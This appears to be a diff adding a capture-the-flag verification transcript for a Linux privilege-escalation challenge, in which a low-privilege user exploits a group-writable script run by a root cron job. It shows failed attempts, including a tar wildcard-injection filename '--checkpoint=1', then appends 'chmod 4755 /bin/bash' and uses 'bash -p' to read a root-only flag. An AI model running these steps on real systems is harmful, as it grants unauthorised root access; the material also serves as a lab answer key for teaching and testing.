@@ -1,0 +1,71 @@
+
+player@lx03:~$ id
+uid=1001(player) gid=1001(player) groups=1001(player),996(web)
+
+player@lx03:~$ ls -ld /opt /opt/archive; ls -l /opt/archive/
+drwxr-xr-x 1 root root 4096 Nov 19 00:10 /opt
+drwxr-xr-x 1 root root 4096 Nov 19 00:10 /opt/archive
+total 4
+-rwxrwxr-x 1 root web 550 Nov 19 00:10 run.sh
+
+player@lx03:~$ cat /etc/cron.d/archive; ls -ld /etc/cron.d
+# Archive uploads every minute (managed by ops)
+* * * * * root /opt/archive/run.sh
+drwxr-xr-x 1 root root 4096 Nov 19 00:10 /etc/cron.d
+
+player@lx03:~$ cat /var/log/archive.log 2>&1 | tail -3
+[2026-11-19 00:11:01] archive job start
+[2026-11-19 00:11:01] archive job done
+
+player@lx03:~$ ls -l /srv/uploads /backup
+/backup:
+total 4
+-rw-r--r-- 1 root root 165 Nov 19 00:11 uploads.tar.gz
+
+/srv/uploads:
+total 4
+-rw-r--r-- 1 root root 16 Nov 19 00:10 report-0310.pdf
+
+player@lx03:~$ ls -l /flag.txt
+-r-------- 1 root root 18 Nov 19 00:10 /flag.txt
+
+--- 负向：改 cron 配置 / 替换脚本 / 上推动目录 ---
+
+player@lx03:~$ echo 'x' >> /etc/cron.d/archive 2>&1
+bash: line 1: /etc/cron.d/archive: Permission denied
+
+player@lx03:~$ rm -f /opt/archive/run.sh 2>&1
+rm: cannot remove '/opt/archive/run.sh': Permission denied
+
+player@lx03:~$ mv /opt/archive/run.sh /tmp/run.sh 2>&1
+mv: cannot move '/opt/archive/run.sh' to '/tmp/run.sh': Permission denied
+
+player@lx03:~$ echo hi > /opt/archive/new.sh 2>&1
+bash: line 1: /opt/archive/new.sh: Permission denied
+
+player@lx03:~$ touch /srv/uploads/--checkpoint=1 /srv/uploads/pwn.tar 2>&1; ls -l /srv/uploads | head -5
+total 4
+-rw-rw-r-- 1 player player  0 Nov 19 00:11 --checkpoint=1
+-rw-rw-r-- 1 player player  0 Nov 19 00:11 pwn.tar
+-rw-r--r-- 1 root   root   16 Nov 19 00:10 report-0310.pdf
+
+--- 正向：追加 chmod 4755，等 cron ---
+
+player@lx03:~$ echo 'chmod 4755 /bin/bash' >> /opt/archive/run.sh; tail -3 /opt/archive/run.sh
+echo "[$(date '+%F %T')] archive job done" >> "$LOG"
+chmod 4755 /bin/bash
+
+player@lx03:~$ ls -l /bin/bash
+-rwxr-xr-x 1 root root 1446024 Mar 31  2024 /bin/bash
+等待 cron（75s）...
+
+player@lx03:~$ cat /var/log/archive.log | tail -2
+[2026-11-19 00:13:01] archive job start
+[2026-11-19 00:13:01] archive job done
+
+player@lx03:~$ ls -l /bin/bash
+-rwsr-xr-x 1 root root 1446024 Mar 31  2024 /bin/bash
+
+player@lx03:~$ /bin/bash -p -c 'id; cat /flag.txt'
+uid=1001(player) gid=1001(player) euid=0(root) groups=1001(player),996(web)
+Ly_Flag{prxdc2e7}
